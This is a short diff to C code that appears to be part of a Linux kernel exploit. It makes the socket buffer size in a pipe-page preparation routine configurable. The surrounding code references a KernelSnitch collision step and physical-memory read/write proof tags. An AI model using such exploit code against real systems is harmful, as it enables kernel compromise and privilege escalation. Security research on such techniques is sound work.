@@ -4,6 +4,10 @@
 #include P0_FINGERPRINT_HEADER
 #endif
 
+#ifndef PIPE_PREP_SKB_SEND_SIZE
+#define PIPE_PREP_SKB_SEND_SIZE SKB_SEND_SIZE
+#endif
+
 #define PHYSRW_PROOF_OFF 0x7000
 #define PHYS_READ_TAG "nebusec_70687973727730"
 #define PHYS_WRITE_TAG "nebusec_70687973727731"
@@ -154,8 +158,8 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     pr_error("pipe KernelSnitch collision finding failed\n");
   }
 
-  unsigned char *buf = malloc(SKB_SEND_SIZE);
-  memset(buf, 0x50, SKB_SEND_SIZE);
+  unsigned char *buf = malloc(PIPE_PREP_SKB_SEND_SIZE);
+  memset(buf, 0x50, PIPE_PREP_SKB_SEND_SIZE);
 
   int skb_sv[2];
   int pcp_sv[2];
@@ -165,7 +169,7 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   struct iovec iov;
   memset(&iov, 0, sizeof(iov));
   iov.iov_base = buf;
-  iov.iov_len = SKB_SEND_SIZE;
+  iov.iov_len = PIPE_PREP_SKB_SEND_SIZE;
 
   struct msghdr msg;
   memset(&msg, 0, sizeof(msg));
